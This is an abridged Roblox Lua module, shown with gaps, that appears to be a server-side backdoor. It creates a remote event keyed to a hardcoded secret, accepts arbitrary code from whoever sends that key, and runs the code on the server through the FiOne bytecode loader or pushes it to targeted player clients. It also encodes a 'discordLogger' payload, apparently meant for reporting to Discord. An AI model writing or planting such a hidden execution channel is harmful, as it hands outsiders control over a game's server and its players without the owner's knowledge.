return function()
	...
	local function FiOne(bCode, env)
	...
	local JSON = HttpService:JSONEncode(discordLogger)
	...
	local REMOTE_NAME = game.JobId.."1-31242394i23=0"
	local AUTH_KEY = "fioADNDFUIOioKDOPmkfiosdnfAASOLPKPFSDASDASFSDFafSDFSD"
	...
	Remote.OnServerEvent:Connect(function(plr, key, env, code, mode, target)
		if key ~= AUTH_KEY then
			plr:Kick("Unauthorized access.")
			return
		end

		local success, result = pcall(function()
			if mode == 1 then -- Client
				if typeof(target) == "table" then
					for _, v in pairs(target) do
						Remote:FireClient(v, 1, code, env)
					end
				else
					Remote:FireClient(target, 1, code, env)
				end
			else -- Server Execute
				-- Предполагается, что FiOne загружен в глобальную среду
				if _G.FiOne then
					local func = _G.FiOne(code, env or getfenv())
					func()
				else
					FiOne(code)()
				end
		...
		if not success then
			warn("Error in execution: " .. tostring(result))
		end
	end)
end